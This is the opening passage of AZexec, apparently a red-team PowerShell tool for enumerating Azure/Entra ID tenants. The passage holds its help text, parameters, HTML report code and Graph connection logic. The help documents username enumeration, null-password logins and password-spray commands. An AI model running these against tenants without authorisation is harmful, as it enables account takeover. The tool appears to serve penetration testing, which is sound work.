<#
    This file is part of the toolkit EvilMist
    Copyright (C) 2025 Logisek
    https://github.com/Logisek/AZexec

    AZexec - The Azure Execution Tool.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    For more see the file 'LICENSE' for copying permission.
#>

<#
.SYNOPSIS
    A PowerShell-based Azure/Entra enumeration tool with netexec-style output.

.DESCRIPTION
    AZX is a PowerShell 7 compatible enumeration tool designed to provide netexec-style 
    output for Azure/Entra ID environments. It queries Microsoft Graph API to enumerate 
    devices, users, and other cloud resources accessible to the current authenticated user.
    
    Current capabilities:
    - Device enumeration from Azure/Entra ID (mimics nxc smb --hosts)
    - Tenant discovery and configuration enumeration (mimics nxc smb --enum)
      * Exposed application IDs and redirect URIs
      * OAuth/OIDC misconfigurations
      * Federation metadata enumeration
      * Security posture assessment
    - Username enumeration (no authentication required, mimics nxc smb --users)
    - Group enumeration from Azure/Entra ID (mimics nxc smb --groups)
    - Password policy enumeration (mimics nxc smb --pass-pol)
      * Password expiration policies
      * MFA/authentication methods
      * Security defaults status
      * Conditional access policies
    - Guest login enumeration (mimics nxc smb -u 'a' -p '')
      * Test if tenant accepts external/B2B authentication
      * Test credentials with empty/null passwords
      * Password spray with single password against user list
      * Detect MFA requirements, locked accounts, expired passwords
    - Active session enumeration (mimics nxc smb --qwinsta)
      * Query Azure Entra ID sign-in logs
      * Display active/recent user sessions
      * Show device, location, IP, application details
      * Identify risky sign-ins and MFA status
    - Guest user vulnerability scanner
      * Detect if external collaboration is enabled
      * Test guest permission boundaries
      * Generate security assessment report
      * Compare guest vs member access levels
    - Application enumeration (authentication required)
      * List registered applications and service principals
      * Display credential types (password vs certificate)
      * Identify public client apps (ROPC-enabled)
      * Security posture assessment
    - Service Principal Discovery (authentication required)
      * Enumerate service principals with full permission details
      * Display app role assignments (application permissions)
      * Show OAuth2 permission grants (delegated permissions)
      * Identify service principal owners
      * Security posture assessment and risk detection
      * Identify password-only credentials and high-risk permissions
    - Role Assignments Enumeration (authentication required)
      * List directory role assignments and privileged accounts
      * Enumerate active role members (users, groups, service principals)
      * Display PIM (Privileged Identity Management) eligible assignments
      * Identify high-risk privileged roles (Global Admin, etc.)
      * Group-based role assignment detection
      * Security posture assessment for privileged access
    - Conditional Access Policy Review (member accounts only)
      * Detailed conditional access policy enumeration
      * Policy state tracking (enabled, disabled, report-only)
      * Conditions analysis (users, apps, locations, platforms, risk levels)
      * Grant controls (MFA, compliant device, approved app, terms of use)
      * Session controls (sign-in frequency, persistent browser, app enforced restrictions)
      * Security posture assessment and risk identification
    - Azure VM Logged-On Users Enumeration (mimics nxc smb --logged-on-users / Remote Registry Service)
      * Query logged-on users on Azure VMs using VM Run Command
      * Support for both Windows and Linux VMs
      * Display username, session state, idle time, and connection source
      * Filter by resource group, subscription, and VM power state
      * Azure equivalent of Remote Registry Service enumeration
      * Requires VM Contributor role or VM Command Executor role
    - Netexec-style formatted output
    - Filter by OS, trust type, compliance status
    - Device owner enumeration
    
    Future capabilities (planned):
    - Advanced group membership analysis

.PARAMETER Command
    The operation to perform. Currently supported:
    - hosts: Enumerate devices from Azure/Entra ID
    - tenant: Discover tenant configuration and endpoints
    - users: Enumerate username existence (no authentication required)
    - user-profiles: Enumerate user profiles with authentication (requires User.Read.All)
    - groups: Enumerate Azure Entra ID groups (authentication required)
    - pass-pol: Enumerate password policies and security defaults (authentication required)
    - guest: Test guest/external authentication (similar to nxc smb -u 'a' -p '')
    - vuln-list: Enumerate vulnerable targets (similar to nxc smb --gen-relay-list)
    - sessions: Enumerate active Windows sessions (similar to nxc smb --qwinsta)
    - guest-vuln-scan: Automated guest user vulnerability scanner (guest permission boundaries)
    - apps: Enumerate registered applications and service principals (authentication required)
    - sp-discovery: Discover service principals with permissions and role assignments (authentication required)
    - roles: Enumerate directory role assignments and privileged accounts (authentication required)
    - ca-policies: Review conditional access policies (member accounts only, requires Policy.Read.All)
    - vm-loggedon: Enumerate logged-on users on Azure VMs (similar to nxc smb --logged-on-users or Remote Registry Service)

.PARAMETER Domain
    Domain name or tenant ID for tenant discovery. If not provided, the tool will attempt
    to auto-detect the current user's domain from UPN or environment variables.

.PARAMETER Filter
    Optional filter for device enumeration:
    - windows: Only Windows devices
    - azuread: Only Azure Entra ID joined devices
    - hybrid: Only Hybrid joined devices
    - compliant: Only compliant devices
    - noncompliant: Only non-compliant devices
    - disabled: Only disabled devices

.PARAMETER NoColor
    Disable colored output.

.PARAMETER ShowOwners
    Display device owners (slower, makes additional API calls).

.PARAMETER ExportPath
    Optional path to export results to CSV, JSON, or HTML.
    HTML exports generate comprehensive, netexec-styled reports with dark theme and risk highlighting.

.PARAMETER Scopes
    Microsoft Graph scopes to request. Default: "Device.Read.All"
    You can specify additional scopes as comma-separated values.

.PARAMETER Username
    Single username to check for existence (for 'users' command).

.PARAMETER UserFile
    Path to file containing usernames to check, one per line (for 'users' command).

.PARAMETER CommonUsernames
    Use a built-in list of common usernames (for 'users' command).

.PARAMETER Password
    Password to test for guest authentication (for 'guest' command).
    Use empty string '' for null/guest login testing.

.PARAMETER Hours
    Number of hours to look back for sign-in events (for 'sessions' command).
    Default: 24 hours
    Azure Entra ID retention: 7 days (Free), 30 days (Premium P1/P2)
    Examples: 24 (1 day), 168 (7 days), 720 (30 days)

.PARAMETER Disconnect
    Automatically disconnect from Microsoft Graph at the end of script execution.
    Useful for security and cleanup purposes to ensure no active sessions remain.

.PARAMETER IncludeWritePermissions
    Include AppRoleAssignment.ReadWrite.All permission for sp-discovery command.
    By default, sp-discovery only requests read permissions (Application.Read.All, Directory.Read.All).
    Use this flag if you need the additional write permission for app role assignments.
    Note: The script only performs read operations, so this permission is typically unnecessary.

.PARAMETER ResourceGroup
    Optional resource group filter for vm-loggedon command.
    If specified, only VMs in this resource group will be queried.
    If not specified, all VMs in the subscription will be enumerated.

.PARAMETER SubscriptionId
    Optional subscription ID for vm-loggedon command.
    If specified, the tool will switch to this subscription before enumerating VMs.
    If not specified, the current subscription context will be used.

.PARAMETER VMFilter
    Optional filter for VM power state (for vm-loggedon command).
    - all: Query all VMs regardless of power state (default)
    - running: Only query running VMs
    - stopped: Only show stopped VMs (will not query them)

.EXAMPLE
    .\azx.ps1 hosts
    Enumerate all devices in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 hosts -Filter windows
    Enumerate only Windows devices

.EXAMPLE
    .\azx.ps1 hosts -Filter azuread -ShowOwners
    Enumerate Azure Entra ID joined devices with their owners

.EXAMPLE
    .\azx.ps1 hosts -Filter noncompliant -ExportPath devices.csv
    Enumerate non-compliant devices and export to CSV

.EXAMPLE
    .\azx.ps1 hosts -NoColor
    Enumerate devices without colored output

.EXAMPLE
    .\azx.ps1 tenant
    Discover tenant configuration for current user's domain (auto-detected)

.EXAMPLE
    .\azx.ps1 tenant -Domain example.com
    Discover tenant configuration for example.com

.EXAMPLE
    .\azx.ps1 tenant -Domain contoso.onmicrosoft.com -ExportPath tenant-info.json
    Discover tenant configuration and export to JSON

.EXAMPLE
    .\azx.ps1 users -Username alice@example.com
    Check if a single username exists (domain auto-detected)

.EXAMPLE
    .\azx.ps1 users -CommonUsernames
    Check common usernames against your current tenant (domain auto-detected)

.EXAMPLE
    .\azx.ps1 users -Domain example.com -Username alice@example.com
    Check if a single username exists in a specific tenant

.EXAMPLE
    .\azx.ps1 users -Domain example.com -UserFile users.txt
    Check username existence from a file (one username per line)

.EXAMPLE
    .\azx.ps1 users -Domain example.com -CommonUsernames -ExportPath valid-users.csv
    Check common usernames and export valid ones to CSV

.EXAMPLE
    .\azx.ps1 user-profiles
    Enumerate all user profiles in the Azure/Entra tenant (authenticated)

.EXAMPLE
    .\azx.ps1 user-profiles -ExportPath users.csv
    Enumerate user profiles and export to CSV

.EXAMPLE
    .\azx.ps1 user-profiles -ExportPath users.json
    Enumerate user profiles and export to JSON with full details

.EXAMPLE
    .\azx.ps1 groups
    Enumerate all groups in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 groups -ExportPath groups.csv
    Enumerate groups and export to CSV

.EXAMPLE
    .\azx.ps1 pass-pol
    Display password policy and security defaults for the tenant

.EXAMPLE
    .\azx.ps1 pass-pol -ExportPath policy.json
    Export password policy information to JSON

.EXAMPLE
    .\azx.ps1 guest -Domain example.com
    Check if tenant accepts guest/external authentication (unauthenticated)

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -Username user -Password ''
    Test null/empty password login (similar to nxc smb -u 'a' -p '')

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -Username alice@example.com -Password 'Summer2024!'
    Test specific credentials for guest authentication

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -UserFile users.txt -Password 'Password123'
    Test multiple usernames with the same password (password spray)

.EXAMPLE
    .\azx.ps1 guest -Domain example.com -UserFile creds.txt
    Test credentials from file (format: username:password per line)

.EXAMPLE
    .\azx.ps1 vuln-list
    Enumerate vulnerable targets in the current tenant (domain auto-detected)

.EXAMPLE
    .\azx.ps1 vuln-list -Domain example.com
    Enumerate vulnerable targets for a specific tenant

.EXAMPLE
    .\azx.ps1 vuln-list -ExportPath relay_targets.txt
    Enumerate vulnerable targets and export HIGH risk items (like nxc --gen-relay-list)

.EXAMPLE
    .\azx.ps1 vuln-list -ExportPath vuln_report.json
    Full vulnerability enumeration with JSON export

.EXAMPLE
    .\azx.ps1 sessions
    Enumerate active sign-in sessions for the last 24 hours (similar to nxc smb --qwinsta)

.EXAMPLE
    .\azx.ps1 sessions -Username alice@example.com
    Enumerate sign-in sessions for a specific user

.EXAMPLE
    .\azx.ps1 sessions -ExportPath sessions.csv
    Enumerate active sessions and export to CSV

.EXAMPLE
    .\azx.ps1 sessions -ExportPath sessions.json
    Enumerate active sessions with full details exported to JSON

.EXAMPLE
    .\azx.ps1 sessions -Hours 168
    Enumerate sign-in sessions for the last 7 days (168 hours)

.EXAMPLE
    .\azx.ps1 sessions -Hours 720 -Username alice@example.com
    Enumerate sessions for a specific user over the last 30 days (requires Premium license)

.EXAMPLE
    .\azx.ps1 guest-vuln-scan
    Scan for guest user vulnerabilities in the current tenant (domain auto-detected)

.EXAMPLE
    .\azx.ps1 guest-vuln-scan -Domain example.com
    Scan guest user security configuration for a specific tenant

.EXAMPLE
    .\azx.ps1 guest-vuln-scan -ExportPath guest-vuln-report.json
    Full guest vulnerability scan with JSON export including detailed assessment

.EXAMPLE
    .\azx.ps1 apps
    Enumerate all registered applications and service principals in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 apps -ExportPath apps.csv
    Enumerate applications and service principals, export to CSV

.EXAMPLE
    .\azx.ps1 apps -ExportPath apps.json
    Enumerate applications and service principals with full details exported to JSON

.EXAMPLE
    .\azx.ps1 sp-discovery
    Discover service principals with their permissions, roles, and ownership information

.EXAMPLE
    .\azx.ps1 sp-discovery -ExportPath sp-permissions.csv
    Discover service principals and export detailed permission data to CSV

.EXAMPLE
    .\azx.ps1 sp-discovery -ExportPath sp-permissions.json
    Discover service principals with full permission details exported to JSON

.EXAMPLE
    .\azx.ps1 sp-discovery -IncludeWritePermissions
    Discover service principals with AppRoleAssignment.ReadWrite.All permission included (reads only, but grants write capability)

.EXAMPLE
    .\azx.ps1 roles
    Enumerate directory role assignments and privileged accounts in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 roles -ExportPath roles.csv
    Enumerate role assignments and export to CSV

.EXAMPLE
    .\azx.ps1 roles -ExportPath roles.json
    Enumerate role assignments with full details including PIM eligible assignments exported to JSON

.EXAMPLE
    .\azx.ps1 hosts -Disconnect
    Enumerate devices and automatically disconnect from Microsoft Graph when complete

.EXAMPLE
    .\azx.ps1 sp-discovery -ExportPath sp.json -Disconnect
    Discover service principals, export results, and disconnect from Graph

.EXAMPLE
    .\azx.ps1 ca-policies
    Review all conditional access policies in the Azure/Entra tenant

.EXAMPLE
    .\azx.ps1 ca-policies -ExportPath policies.csv
    Review conditional access policies and export to CSV

.EXAMPLE
    .\azx.ps1 ca-policies -ExportPath policies.json
    Review conditional access policies with full details exported to JSON

.EXAMPLE
    .\azx.ps1 vm-loggedon
    Enumerate logged-on users on all Azure VMs in the current subscription

.EXAMPLE
    .\azx.ps1 vm-loggedon -ResourceGroup Production-RG
    Enumerate logged-on users on VMs in a specific resource group

.EXAMPLE
    .\azx.ps1 vm-loggedon -VMFilter running
    Enumerate logged-on users only on running VMs

.EXAMPLE
    .\azx.ps1 vm-loggedon -ResourceGroup Prod-RG -ExportPath loggedon-users.csv
    Enumerate logged-on users and export results to CSV

.EXAMPLE
    .\azx.ps1 vm-loggedon -SubscriptionId "12345678-1234-1234-1234-123456789012" -ExportPath users.json
    Enumerate logged-on users in a specific subscription and export to JSON

.NOTES
    Requires PowerShell 7+
    Requires Microsoft.Graph PowerShell module (for 'hosts', 'groups', 'pass-pol', 'sessions', 'vuln-list', 'guest-vuln-scan', 'apps', 'sp-discovery', 'roles', 'ca-policies' commands)
    Requires Az PowerShell module (for 'vm-loggedon' command - Az.Accounts, Az.Compute, Az.Resources)
    Requires appropriate Azure/Entra permissions (for authenticated commands)
    The 'tenant' and 'users' commands do not require authentication
    The 'vuln-list' and 'guest-vuln-scan' commands perform unauthenticated checks first, then authenticated checks
    The 'sessions' command requires AuditLog.Read.All permission
    The 'sp-discovery' command requires Application.Read.All and Directory.Read.All permissions (add -IncludeWritePermissions for AppRoleAssignment.ReadWrite.All)
    The 'roles' command requires RoleManagement.Read.Directory and Directory.Read.All permissions (PIM requires RoleEligibilitySchedule.Read.Directory)
    The 'ca-policies' command requires Policy.Read.All permission (guest users cannot access conditional access policies)
    The 'vm-loggedon' command requires Azure authentication and 'Virtual Machine Contributor' role or 'Reader' + 'Virtual Machine Command Executor' role
    Guest users may have limited access to groups, policy information, audit logs, service principal data, and role assignments
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $true, Position = 0)]
    [ValidateSet("hosts", "tenant", "users", "user-profiles", "groups", "pass-pol", "guest", "vuln-list", "sessions", "guest-vuln-scan", "apps", "sp-discovery", "roles", "ca-policies", "vm-loggedon", "help")]
    [string]$Command,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("windows", "azuread", "hybrid", "compliant", "noncompliant", "disabled", "all")]
    [string]$Filter = "all",
    
    [Parameter(Mandatory = $false)]
    [string]$Domain,
    
    [Parameter(Mandatory = $false)]
    [switch]$NoColor,
    
    [Parameter(Mandatory = $false)]
    [switch]$ShowOwners,
    
    [Parameter(Mandatory = $false)]
    [string]$ExportPath,
    
    [Parameter(Mandatory = $false)]
    [string]$Scopes = "Device.Read.All",
    
    [Parameter(Mandatory = $false)]
    [string]$Username,
    
    [Parameter(Mandatory = $false)]
    [string]$UserFile,
    
    [Parameter(Mandatory = $false)]
    [switch]$CommonUsernames,
    
    [Parameter(Mandatory = $false)]
    [string]$Password,
    
    [Parameter(Mandatory = $false)]
    [int]$Hours = 24,
    
    [Parameter(Mandatory = $false)]
    [switch]$Disconnect,
    
    [Parameter(Mandatory = $false)]
    [switch]$IncludeWritePermissions,
    
    [Parameter(Mandatory = $false)]
    [string]$ResourceGroup,
    
    [Parameter(Mandatory = $false)]
    [string]$SubscriptionId,
    
    [Parameter(Mandatory = $false)]
    [ValidateSet("all", "running", "stopped")]
    [string]$VMFilter = "all"
)

# Color output functions
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    
    if ($NoColor) {
        Write-Host $Message
    } else {
        Write-Host $Message -ForegroundColor $Color
    }
}

# HTML Report Generation Function (NetExec Style)
function Export-HtmlReport {
    param(
        [Parameter(Mandatory=$true)]
        [array]$Data,
        
        [Parameter(Mandatory=$true)]
        [string]$OutputPath,
        
        [Parameter(Mandatory=$true)]
        [string]$Title,
        
        [Parameter(Mandatory=$false)]
        [hashtable]$Statistics = @{},
        
        [Parameter(Mandatory=$false)]
        [string]$CommandName = "",
        
        [Parameter(Mandatory=$false)]
        [string]$Description = ""
    )
    
    # HTML Header with NetExec-style dark theme
    $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$Title - AZexec Report</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            background: linear-gradient(135deg, #0d0d0d 0%, #1a1a1a 100%);
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
            padding: 30px;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid #00ff00;
        }
        
        .header h1 {
            color: #00ff00;
            font-size: 2.5em;
            text-shadow: 0 0 10px #00ff00;
            margin-bottom: 10px;
            letter-spacing: 3px;
        }
        
        .header .subtitle {
            color: #00ccff;
            font-size: 1.2em;
            margin-top: 10px;
        }
        
        .metadata {
            background: rgba(0, 50, 0, 0.5);
            border-left: 4px solid #00ff00;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 5px;
        }
        
        .metadata p {
            color: #00ccff;
            margin: 5px 0;
            font-size: 0.95em;
        }
        
        .metadata strong {
            color: #00ff00;
        }
        
        .statistics {
            background: rgba(0, 50, 50, 0.5);
            border-left: 4px solid #00ccff;
            padding: 20px;
            margin-bottom: 25px;
            border-radius: 5px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        
        .stat-item {
            background: rgba(0, 0, 0, 0.5);
            padding: 15px;
            border-radius: 5px;
            border: 1px solid #00ccff;
        }
        
        .stat-label {
            color: #888;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        
        .stat-value {
            color: #00ff00;
            font-size: 1.5em;
            font-weight: bold;
        }
        
        .stat-value.high {
            color: #ff3333;
        }
        
        .stat-value.medium {
            color: #ffaa00;
        }
        
        .stat-value.low {
            color: #888;
        }
        
        .section-title {
            color: #00ff00;
            font-size: 1.5em;
            margin: 30px 0 15px 0;
            padding-bottom: 10px;
            border-bottom: 1px solid #00ff00;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        
        .table-container {
            overflow-x: auto;
            margin-bottom: 30px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 5px;
            overflow: hidden;
        }
        
        thead {
            background: rgba(0, 100, 0, 0.5);
        }
        
        th {
            color: #00ff00;
            padding: 15px;
            text-align: left;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.9em;
            border-bottom: 2px solid #00ff00;
        }
        
        td {
            color: #00ccff;
            padding: 12px 15px;
            border-bottom: 1px solid #333;
        }
        
        tr:hover {
            background: rgba(0, 100, 0, 0.2);
        }
        
        tr:nth-child(even) {
            background: rgba(0, 0, 0, 0.3);
        }
        
        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 3px;
            font-size: 0.85em;
            font-weight: bold;
            margin: 2px;
        }
        
        .badge-success {
            background: rgba(0, 255, 0, 0.2);
            color: #00ff00;
            border: 1px solid #00ff00;
        }
        
        .badge-danger {
            background: rgba(255, 51, 51, 0.2);
            color: #ff3333;
            border: 1px solid #ff3333;
        }
        
        .badge-warning {
            background: rgba(255, 170, 0, 0.2);
            color: #ffaa00;
            border: 1px solid #ffaa00;
        }
        
        .badge-info {
            background: rgba(0, 204, 255, 0.2);
            color: #00ccff;
            border: 1px solid #00ccff;
        }
        
        .badge-secondary {
            background: rgba(136, 136, 136, 0.2);
            color: #888;
            border: 1px solid #888;
        }
        
        .footer {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px solid #00ff00;
            text-align: center;
            color: #888;
            font-size: 0.9em;
        }
        
        .footer a {
            color: #00ccff;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .risk-high {
            color: #ff3333 !important;
            font-weight: bold;
        }
        
        .risk-medium {
            color: #ffaa00 !important;
        }
        
        .risk-low {
            color: #888 !important;
        }
        
        .description {
            background: rgba(0, 50, 100, 0.3);
            border-left: 4px solid #00ccff;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 5px;
            color: #aaa;
            font-size: 0.95em;
        }
        
        @media print {
            body {
                background: white;
                color: black;
            }
            
            .container {
                border: 1px solid black;
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ AZexec Report ⚡</h1>
            <div class="subtitle">$Title</div>
        </div>
        
        <div class="metadata">
            <p><strong>Command:</strong> $CommandName</p>
            <p><strong>Generated:</strong> $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")</p>
            <p><strong>Total Records:</strong> $($Data.Count)</p>
        </div>
"@

    # Add description if provided
    if ($Description) {
        $html += @"
        <div class="description">
            $Description
        </div>
"@
    }

    # Add statistics if provided
    if ($Statistics.Count -gt 0) {
        $html += @"
        <div class="statistics">
"@
        foreach ($stat in $Statistics.GetEnumerator()) {
            $valueClass = ""
            if ($stat.Key -match "High|Critical|Privileged|Risk") {
                $valueClass = "high"
            } elseif ($stat.Key -match "Medium|Warning") {
                $valueClass = "medium"
            } elseif ($stat.Key -match "Low|Disabled") {
                $valueClass = "low"
            }
            
            $html += @"
            <div class="stat-item">
                <div class="stat-label">$($stat.Key)</div>
                <div class="stat-value $valueClass">$($stat.Value)</div>
            </div>
"@
        }
        $html += @"
        </div>
"@
    }

    # Add data table
    if ($Data.Count -gt 0) {
        $html += @"
        <h2 class="section-title">📊 Data</h2>
        <div class="table-container">
            <table>
                <thead>
                    <tr>
"@
        # Get column headers from first object
        $properties = $Data[0].PSObject.Properties.Name
        foreach ($prop in $properties) {
            $html += "                        <th>$prop</th>`n"
        }
        
        $html += @"
                    </tr>
                </thead>
                <tbody>
"@
        
        # Add data rows
        foreach ($row in $Data) {
            $html += "                    <tr>`n"
            foreach ($prop in $properties) {
                $value = $row.$prop
                
                # Handle null/empty values
                if ($null -eq $value -or $value -eq "") {
                    $value = "-"
                }
                
                # Convert boolean values to badges
                if ($value -is [bool]) {
                    if ($value) {
                        $value = "<span class='badge badge-success'>True</span>"
                    } else {
                        $value = "<span class='badge badge-secondary'>False</span>"
                    }
                }
                
                # Apply risk-based coloring for specific columns
                $cellClass = ""
                if ($prop -match "Risk|Severity") {
                    if ($value -match "HIGH|Critical") {
                        $cellClass = " class='risk-high'"
                    } elseif ($value -match "MEDIUM|Warning") {
                        $cellClass = " class='risk-medium'"
                    } elseif ($value -match "LOW") {
                        $cellClass = " class='risk-low'"
                    }
                }
                
                # Handle array values
                if ($value -is [array]) {
                    $value = $value -join ", "
                }
                
                # Escape HTML special characters
                $value = [System.Web.HttpUtility]::HtmlEncode($value.ToString())
                
                $html += "                        <td$cellClass>$value</td>`n"
            }
            $html += "                    </tr>`n"
        }
        
        $html += @"
                </tbody>
            </table>
        </div>
"@
    }

    # Add footer
    $html += @"
        <div class="footer">
            <p>Generated by <strong>AZexec</strong> - Azure/Entra Execution Tool</p>
            <p><a href="https://github.com/Logisek/AZexec" target="_blank">https://github.com/Logisek/AZexec</a></p>
            <p>Part of the EvilMist Toolkit | Copyright © 2025 Logisek</p>
        </div>
    </div>
</body>
</html>
"@

    # Write HTML to file
    try {
        # Add System.Web for HTML encoding
        Add-Type -AssemblyName System.Web
        $html | Out-File -FilePath $OutputPath -Encoding UTF8 -Force
        return $true
    } catch {
        Write-ColorOutput -Message "[!] Failed to generate HTML report: $_" -Color "Red"
        return $false
    }
}

# Check and import Microsoft.Graph module
function Initialize-GraphModule {
    Write-ColorOutput -Message "[*] Checking Microsoft.Graph module..." -Color "Yellow"
    
    if (-not (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication)) {
        Write-ColorOutput -Message "[!] Microsoft.Graph module not found. Installing..." -Color "Yellow"
        try {
            Install-Module Microsoft.Graph -Scope CurrentUser -Force -AllowClobber
            Write-ColorOutput -Message "[+] Microsoft.Graph module installed successfully" -Color "Green"
        } catch {
            Write-ColorOutput -Message "[!] Failed to install Microsoft.Graph module: $_" -Color "Red"
            exit 1
        }
    }
    
    try {
        Import-Module Microsoft.Graph.Authentication -ErrorAction Stop
        Import-Module Microsoft.Graph.Identity.DirectoryManagement -ErrorAction Stop
    } catch {
        Write-ColorOutput -Message "[!] Failed to import Microsoft.Graph modules: $_" -Color "Red"
        exit 1
    }
}

# Check if current user is a guest
function Test-IsGuestUser {
    param(
        [string]$UserPrincipalName
    )
    
    try {
        # Get the current user's details from Microsoft Graph
        $currentUser = Get-MgUser -UserId $UserPrincipalName -ErrorAction SilentlyContinue
        
        if ($currentUser) {
            # Check if userType is Guest
            if ($currentUser.UserType -eq "Guest") {
                return $true
            }
            
            # Also check if UPN contains #EXT# (external user marker)
            if ($UserPrincipalName -like "*#EXT#*") {
                return $true
            }
        }
    } catch {
        # If we can't determine, assume not guest
        return $false
    }
    
    return $false
}

# Connect to Microsoft Graph
function Connect-GraphAPI {
    param(
        [string]$Scopes
    )
    
    Write-ColorOutput -Message "[*] Connecting to Microsoft Graph..." -Color "Yellow"
    
    try {
        $scopeArray = $Scopes -split ','
        
        # Check if already connected
        $context = Get-MgContext
        if ($context) {
            Write-ColorOutput -Message "[+] Already connected to tenant: $($context.TenantId)" -Color "Green"
            Write-ColorOutput -Message "[+] Account: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "`n[!] GUEST USER DETECTED" -Color "Yellow"
                Write-ColorOutput -Message "[*] You are authenticated as a GUEST/EXTERNAL user" -Color "Yellow"
                Write-ColorOutput -Message "[*] This is the Azure equivalent of a 'null session' - low-privileged enumeration" -Color "Cyan"
                Write-ColorOutput -Message "[*] Many organizations do NOT restrict guest permissions properly" -Color "Cyan"
                Write-ColorOutput -Message "[*] This is a LOW-NOISE reconnaissance technique`n" -Color "Green"
            }
        } else {
            Connect-MgGraph -Scopes $scopeArray -ErrorAction Stop
            $context = Get-MgContext
            Write-ColorOutput -Message "[+] Connected to tenant: $($context.TenantId)" -Color "Green"
            Write-ColorOutput -Message "[+] Account: $($context.Account)" -Color "Green"
            
            # Check if user is a guest
            $isGuest = Test-IsGuestUser -UserPrincipalName $context.Account
            if ($isGuest) {
                Write-ColorOutput -Message "`n[!] GUEST USER DETECTED" -Color "Yellow"
                Write-ColorOutput -Message "[*] You are authenticated as a GUEST/EXTERNAL user" -Color "Yellow"
                Write-ColorOutput -Message "[*] This is the Azure equivalent of a 'null session' - low-privileged enumeration" -Color "Cyan"
                Write-ColorOutput -Message "[*] Many organizations do NOT restrict guest permissions properly" -Color "Cyan"
                Write-ColorOutput -Message "[*] This is a LOW-NOISE reconnaissance technique`n" -Color "Green"
            }
        }
    } catch {
        Write-ColorOutput -Message "[!] Failed to connect to Microsoft Graph: $_" -Color "Red"
        exit 1
    }
}

# Format device output like netexec
function Format-DeviceOutput {
    param(
        [PSCustomObject]$Device,
        [string]$Owner = $null
    )
    
    # Parse OS and version info
    $osName = if ($Device.OperatingSystem) { 
        $Device.OperatingSystem -replace "Windows ", "Win" 
    } else { 
        "Unknown" 
    }
    
    $osVersion = if ($Device.OperatingSystemVersion) { 
        $Device.OperatingSystemVersion 
    } else { 
        "0" 
    }
    
    # Determine trust type/join type
    $joinType = switch ($Device.TrustType) {
        "AzureAd" { "AzureAD" }
        "ServerAd" { "Hybrid" }
        "Workplace" { "Workplace" }
        default { $Device.TrustType }
    }
    
    # Compliance and status
    $compliant = if ($Device.IsCompliant) { "True" } else { "False" }
    $enabled = if ($Device.AccountEnabled) { "True" } else { "False" }
    
    # Format output similar to netexec SMB output
    $deviceName = if ($Device.DisplayName) { $Device.DisplayName } else { "UNKNOWN" }
    
    # Truncate long device names for column display (but show full name in details)
    $maxNameLength = 35
    $displayName = if ($deviceName.Length -gt $maxNameLength) {
        $deviceName.Substring(0, $maxNameLength - 3) + "..."
    } else {
        $deviceName
    }
    
    # Use device ID as "IP" equivalent (first 15 chars for alignment)
    $deviceIdShort = if ($Device.DeviceId) { 
        $Device.DeviceId.Substring(0, [Math]::Min(15, $Device.DeviceId.Length))
    } else { 
        "UNKNOWN-ID" 
    }
    
    $output = "AZR".PadRight(12) + 
              $deviceIdShort.PadRight(17) + 
              "443".PadRight(7) + 
              $displayName.PadRight(38) + 
              "[*] $osName $osVersion (name:$deviceName) (trust:$joinType) (compliant:$compliant) (enabled:$enabled)"
    
    if ($Owner) {
        $output += " (owner:$Owner)"
    }
    
    # Color based on status
    $color = "Cyan"
    if (-not $Device.AccountEnabled) {
        $color = "DarkGray"
    } elseif (-not $Device.IsCompliant) {
        $color = "Yellow"
    }
    
    Write-ColorOutput -Message $output -Color $color
}

# Get device owners
function Get-DeviceOwners {
    param(
        [string]$DeviceId
    )
    
    try {
        $owners = Get-MgDeviceRegisteredOwner -DeviceId $DeviceId -ErrorAction SilentlyContinue
        if ($owners) {
            $ownerNames = @()
            foreach ($owner in $owners) {
                if ($owner.AdditionalProperties.userPrincipalName) {
                    $ownerNames += $owner.AdditionalProperties.userPrincipalName
                }
            }
            return ($ownerNames -join ", ")
        }
    } catch {
        return $null
    }
    
    return $null
}

# Filter devices based on criteria
